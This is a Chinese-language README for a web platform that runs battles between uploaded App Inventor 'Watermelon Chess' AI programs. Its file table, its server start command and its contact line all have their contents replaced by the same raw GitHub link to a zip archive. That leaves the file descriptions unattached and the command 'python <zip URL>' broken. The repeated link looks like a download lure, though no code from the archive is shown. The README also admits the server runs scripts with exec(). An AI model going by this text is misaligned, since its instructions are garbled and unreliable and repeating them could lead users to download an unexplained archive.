# 西瓜棋 AI 對戰平台系統

本專案提供一個基於 Web 的平台，讓使用者上傳以 App Inventor 設計的「西瓜棋」(Watermelon Chess) AI 程式（`.aia` 檔案），並自動進行 AI 對戰，回傳詳細對戰結果。

---

## 系統架構與流程

1. **上傳 (Upload)**  
   使用者透過 Web 介面上傳 `.aia` 檔案。

2. **處理 (Process)**  
   伺服器解壓縮 `.aia` 檔案，提取 Blockly 程式碼 (`.bky`)，並進行變數名稱等初步處理。

3. **組合 (Combine)**  
   伺服器將兩個參賽者的 AI 程式碼，與預設遊戲引擎模板組合，生成完整的 Python 對戰腳本。

4. **對戰 (Battle)**  
   伺服器執行對戰腳本，模擬完整遊戲過程。

5. **結果 (Result)**  
   伺服器回傳包含詳細步驟與勝負結果的 JSON 對戰報告。

---

## 專案檔案結構與功能

| 檔案名稱                     | 主要用途與功能說明 |
|-----------------------------|--------------------|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`                    | Flask Web 應用主程式。提供 `/upload` 及 `/battle` API，負責檔案上傳、AI 對戰、腳本組合與執行、結果回傳與暫存檔案管理。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`        | 處理 `.aia` 檔案：解壓縮、提取並轉換 Blockly 程式碼，完成變數名稱替換。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`         | 西瓜棋遊戲核心邏輯與 AI 對戰框架範例。定義棋盤、規則、判斷邏輯、AI 決策與主迴圈。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`   | 對戰腳本模板（開頭）：包含 import、全域變數、遊戲函數與紅方 AI 評分函數開頭。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip` | 對戰腳本模板（中段）：紅方 AI 評分函數結尾、黃方 AI 評分函數開頭。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip` | 對戰腳本模板（結尾）：黃方 AI 評分函數結尾、AI 輔助函數、主對戰迴圈。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`                 | 早期/獨立腳本：批次組合 AI 程式碼與模板，生成對戰腳本。|
| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`           | 早期/獨立腳本：將 Blockly 程式碼中的中文變數批次轉換為英文代碼。|

---

## 如何運行

### 1. 安裝環境

建議使用 Python 虛擬環境。安裝所需套件：

```bash
pip install Flask Flask-CORS func-timeout
```

### 2. 建立必要目錄

請確認下列目錄已建立：

- `WaTErmelonChess`
- `CodeTransfer`
- `pythoncodeandb`
- `combine_code`
- `BattleReport`

### 3. 啟動伺服器

```bash
python https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip
```

伺服器預設運行於 `0.0.0.0:5000`。

### 4. 前端互動

請使用前端應用程式呼叫 `/upload` 與 `/battle` API 進行互動。

---

## 注意事項

- **安全性**  
  目前對戰腳本是以 `exec()` 執行，存在安全風險。建議日後改用沙箱（sandbox）或 `subprocess` 執行，限制權限。

- **錯誤處理**  
  建議補強錯誤處理與日誌記錄，方便除錯與維護。

- **暫存檔案管理**  
  建議改用 `tempfile` 模組自動管理臨時檔案。

- **設定檔**  
  將硬編碼的路徑、超時時間等移至設定檔或環境變數。

- **程式碼一致性**  
  建議統一組合邏輯，確認早期腳本是否仍需保留。

---

## 貢獻與改進建議

- 歡迎提出 Pull Request 或 Issue！
- 歡迎協助改善安全性、效能與使用體驗。

---

## 聯絡方式

有任何問題歡迎聯絡專案管理者https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip